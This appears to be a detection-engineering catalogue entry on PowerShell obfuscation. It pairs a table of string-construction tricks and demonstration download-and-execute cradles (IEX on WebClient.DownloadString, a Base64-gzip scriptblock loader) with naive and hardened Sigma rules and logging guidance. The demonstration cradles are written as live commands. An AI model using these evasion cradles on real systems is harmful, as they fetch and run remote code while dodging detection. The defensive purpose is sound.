---
id: ADE1-007
title: Obfuscation
ade_category: ADE1
ade_subcategory: ADE1-01
mitre_attack:
  - T1059.001 (Command and Scripting Interpreter: PowerShell)
  - T1027 (Obfuscated Files or Information)
  - T1140 (Deobfuscate/Decode Files or Information)
platform: Windows
testable: true
---

# Obfuscation

## Summary

Obfuscation is the sustained adversary response to literal-string detection. Where other ADE1 techniques exploit one specific gap (whitespace, quoting, delimiters), obfuscation is the meta-pattern: combine all the syntactic flexibility a runtime offers to construct any required string at runtime, never as a literal. A single static rule cannot defeat determined obfuscation -- defense requires a layered strategy across multiple telemetry surfaces.

## ADE Classification

**Category:** ADE1 -- Reformatting in Actions (in its most extreme form)
**Core principle:** The technique scales the basic "same outcome, different string" principle to its logical limit. The PowerShell runtime is Turing-complete, so there are infinite ways to produce a given string. Rules that pattern-match on the command line lose; the only winning move is to detect the runtime resolution, not the pre-resolution string.

## The Technique

PowerShell provides an extensive toolkit for constructing strings at runtime:

| Primitive | Example | Result |
|-----------|---------|--------|
| String concatenation | `'I'+'E'+'X'` | `IEX` |
| Character codes | `[char]73 + [char]69 + [char]88` | `IEX` |
| Reversal | `'XEI'[2..0] -join ''` | `IEX` |
| Format strings | `'{0}{1}{2}' -f 'I','E','X'` | `IEX` |
| Environment variable slicing | `$env:PUBLIC[3,5,11]` | Picks specific chars |
| Base64 + decompression | `[Convert]::FromBase64String(...)` + GzipStream | Arbitrary payload |
| Encryption | AES-encrypt, decrypt at runtime | Arbitrary payload |
| Aliasing | `set-alias x IEX` | `x` invokes `IEX` |

Combine 2-3 of these and the resulting command line is unrecognizable, even though it executes the same payload. The same principle applies to cmd.exe with Unicode lookalikes, mid-token quote splicing, casing tricks, and superscript characters.

## Bypass Demonstration

### Benign test payload

```powershell
# Goal: invoke IEX on a downloaded script

# Layer 1 -- string concatenation
&('IE' + 'X')(New-Object Net.WebClient).DownloadString('http://example.com/.ps1')

# Layer 2 -- character codes
&([char]73 + [char]69 + [char]88)((New-Object Net.WebClient).DownloadString('http://example.com/.ps1'))

# Layer 3 -- Base64 + decompression
$b64 = '<base64 of compressed payload>'
$gz  = [System.IO.Compression.GzipStream]::new(
        [IO.MemoryStream]::new([Convert]::FromBase64String($b64)),
        [System.IO.Compression.CompressionMode]::Decompress)
$sr  = [IO.StreamReader]::new($gz)
&([scriptblock]::Create($sr.ReadToEnd()))
```

### What the parser sees vs. what the rule sees

| Layer | Sees |
|-------|------|
| Raw command line | Obfuscated form -- no `IEX` literal present |
| PowerShell engine | Resolves all construction to `IEX` at runtime |
| Sysmon EID 1 CommandLine | Obfuscated form (raw) |
| Script Block Logging (4104) | Source-level obfuscation visible; runtime-constructed blocks logged separately |
| AMSI | Deobfuscated form after runtime resolution |

## Vulnerable Rule

```yaml
title: PowerShell IEX Web Cradle (Naive)
id: 88888888-8888-8888-8888-000000000001
status: experimental
description: Detects IEX invoking content fetched from the web
logsource:
  product: windows
  category: ps_script
detection:
  selection_iex:
    ScriptBlockText|contains:
      - 'IEX'
      - 'Invoke-Expression'
  selection_web:
    ScriptBlockText|contains:
      - 'DownloadString'
      - 'Invoke-WebRequest'
  condition: selection_iex and selection_web
level: medium
```

### Why it misses

`ScriptBlockText|contains: 'IEX'` is defeated the moment the literal string `IEX` does not appear in the script -- which is the entire point of obfuscation. Concatenation, character codes, format strings, and runtime construction all produce script text that has no `IEX` substring even though `IEX` ends up being invoked.

## Hardened Rule

Defense in depth across four layers:

**Layer 1 -- Sigma rule on construction primitives:**

```yaml
title: PowerShell Obfuscated Execution (Hardened, Multi-Layer)
id: 88888888-8888-8888-8888-000000000002
status: stable
description: |
  Layered detection for obfuscated PowerShell. Each selection catches one signal.
  Together they raise the cost of obfuscation substantially.
logsource:
  product: windows
  category: ps_script
detection:
  selection_obfuscation_primitives:
    ScriptBlockText|re|i:
      - '\[char\]\s*\d+'
      - "'[^']+'\s*\+\s*'[^']+'"
      - '-join\s*\(\(.+\)\.Split'
      - '\[Convert\]::FromBase64String'
      - '\[System\.IO\.Compression\.GzipStream\]'
      - '\[scriptblock\]::Create'
      - '-bxor\s*0x'
      - '\bset-alias\s+\S+\s+(?:IEX|Invoke-Expression|Invoke-Command|New-Object|Add-Type)'
  selection_invoke_web:
    ScriptBlockText|re|i:
      - '(IEX|Invoke-Expression|&\s*\(?\[scriptblock\])'
  selection_web_fetch:
    ScriptBlockText|re|i:
      - '(DownloadString|DownloadData|Invoke-WebRequest|Invoke-RestMethod|Net\.WebClient)'
  condition: selection_obfuscation_primitives or (selection_invoke_web and selection_web_fetch)
falsepositives:
  - Legitimate installer scripts (e.g., scoop, chocolatey) -- scope by user/path
level: high
```

**Layer 2 -- Script Block Logging (Event ID 4104) must be enabled.** Without it, only command-line content is available and obfuscation wins. Enable `EnableScriptBlockInvocationLogging` for runtime-constructed scriptblocks.

**Layer 3 -- AMSI integration.** Modern AV/EDR receives the deobfuscated form via AMSI before execution. Pattern-matching on AMSI events catches what script-block logging misses (especially runtime construction).

**Layer 4 -- Behavioral chaining.** PowerShell process spawned, made an outbound HTTP request within 5 seconds, and then either spawned a child process or wrote a file. The behavior is invariant; the string representation is not.

Each layer raises the attacker's cost. Layer 1 alone is bypassed in a day. All four together push obfuscation into custom-tooling territory.

## Sysmon Evidence

### Key Fields

| Field | Value | Note |
|-------|-------|------|
| Image | `C:\...\powershell.exe` or `C:\...\pwsh.exe` | Process identity unaffected |
| CommandLine | Obfuscated form | Raw, not deobfuscated |
| OriginalFileName | `PowerShell.EXE` or `pwsh.dll` | From PE VERSION_INFO |
| ScriptBlockText (EID 4104) | Source-level obfuscation visible | Partial deobfuscation only |
| ParentImage | Varies | Invocation context |

## Detection Layers

| Layer | Detects? | Why |
|-------|----------|-----|
| Command-line substring | No | Obfuscation destroys all literal matches |
| Regex on construction primitives | Partial | Catches common building blocks, not custom ones |
| Image field | Partial | Binary identity only, no payload visibility |
| OriginalFileName | Partial | Same as Image -- identity without content |
| Script Block Logging | Partial | Catches source-level obfuscation; misses runtime construction |
| AMSI | Yes | Sees deobfuscated form after runtime resolution |
| Behavioral chaining | Yes | Outcome (network + execution) is invariant to obfuscation |
| Memory inspection | Yes | Resolved strings visible in runspace (EDR-dependent) |

## Implementation Nuances

- **NUANCES #1 (OriginalFileName):** `pwsh.exe` reports `pwsh.dll`. Always OR both Image and OriginalFileName fields.
- **NUANCES #2 (CommandLine is raw):** Obfuscated forms are preserved verbatim in Sysmon. This is the fundamental reason static rules fail.
- **NUANCES #5 (Regex flavor):** The construction-primitive regexes use basic features (character classes, quantifiers, alternation). Test compilation per backend before deployment.
- **NUANCES #9 (Boolean values):** Obfuscation often combines with boolean replacement (e.g., `-Force:1` instead of `-Force:$true`). Layer 1 handles this indirectly via the parameter-name matching pattern.
